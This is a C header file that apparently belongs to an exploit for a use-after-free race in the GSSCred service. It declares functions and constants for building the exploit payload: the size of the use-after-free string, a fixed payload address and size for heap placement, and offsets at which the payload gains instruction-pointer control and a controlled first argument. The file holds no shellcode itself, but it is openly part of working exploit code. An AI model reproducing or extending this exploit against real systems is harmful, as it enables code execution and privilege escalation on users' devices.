#ifndef GSSCRED_RACE__PAYLOAD_H_
#define GSSCRED_RACE__PAYLOAD_H_

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>

// ---- Generic payload generation ----------------------------------------------------------------

// The size of the uaf_string parameter to build_payload().
static const size_t GSSCRED_RACE_UAF_STRING_SIZE = 0x20;

// The size and target address of the payload.
static const size_t   GSSCRED_RACE_PAYLOAD_SIZE    = 0x4000;
static const uint64_t GSSCRED_RACE_PAYLOAD_ADDRESS = 0x0000000120204000;

// Build the UAF string and payload.
bool gsscred_race_build_payload(char *uaf_string, uint8_t *payload);

// ---- Platform-specific payload generation ------------------------------------------------------

// The offset into the payload at which to store the instruction pointer address to jump to.
extern const size_t GSSCRED_RACE_PAYLOAD_OFFSET_PC;

// The offset into the payload at which the first argument will point when we get instruction
// pointer control.
extern const size_t GSSCRED_RACE_PAYLOAD_OFFSET_ARG1;

// The type of a function for platform-specific payload generation.
typedef void (*gsscred_race_platform_payload_generator_fn)(uint8_t *payload);

#endif
